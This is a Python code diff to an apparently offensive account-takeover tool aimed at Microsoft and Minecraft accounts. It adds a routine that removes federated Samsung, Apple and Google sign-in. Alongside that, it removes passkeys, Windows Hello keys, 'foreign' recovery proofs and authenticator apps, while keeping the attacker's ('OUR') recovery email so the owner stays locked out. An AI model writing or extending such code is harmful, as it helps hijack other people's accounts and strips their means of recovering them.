@@ -7,6 +7,7 @@ from securing.utils.security.remove_services import remove_services
 from securing.utils.security.remove_devices import remove_devices
 from securing.utils.security.delete_aliases import delete_aliases
 from securing.utils.security.remove_proof import remove_proof
+from securing.utils.security.remove_fed_cred import remove_fed_cred
 from securing.utils.security.remove_zyger import remove_zyger
 from securing.utils.security.remove_2fa import remove_2fa
 from securing.utils.security.recovery import recover
@@ -482,11 +483,19 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
 
     if not minecon:
 
-        # Pass Keys / Windows Hello Exploit
+        # Pass Keys / Windows Hello / FedCred (Samsung+Apple sign-in) / proofs
         if apicanary:
             await remove_zyger(session, apicanary)
-            # Wipe foreign proofs / auth apps — keep OUR recovery security email
-            # (recovery_secure already attached it; recovery=False skips re-add).
+            # Sign in with Samsung/Apple/Google/… — RemoveFedCred, not DeleteProof
+            try:
+                fed = await remove_fed_cred(session, apicanary)
+                if isinstance(fed, dict):
+                    account_info["microsoft"]["fed_cred_removed"] = fed.get("removed") or []
+            except Exception as exc:
+                log.warning("remove_fed_cred soft-fail: %s", exc)
+                print(f"[!] - remove_fed_cred skipped ({exc.__class__.__name__})")
+            # Wipe foreign proofs / passkeys (iCloud Keychain, Samsung Pass via
+            # RemovePasskey) / auth apps — keep OUR recovery security email.
             keep_sec = (account_info.get("microsoft") or {}).get("security_email")
             wipe = await remove_proof(
                 session,
@@ -498,10 +507,13 @@ async def secure(session: httpx.AsyncClient, command: bool, recovery: bool, acco
                 account_info["microsoft"]["has_sms_proof"] = bool(
                     wipe.get("has_sms_proof")
                 )
+                account_info["microsoft"]["passkeys_removed"] = int(
+                    wipe.get("passkeys_removed") or 0
+                )
             else:
                 account_info["microsoft"]["has_sms_proof"] = False
         else:
-            print("[!] - Skipping remove_zyger/remove_proof (no apiCanary)")
+            print("[!] - Skipping remove_zyger/remove_fed_cred/remove_proof (no apiCanary)")
             account_info["microsoft"]["has_sms_proof"] = None
 
         # Third Party Launchers (Minecraft, Prism)
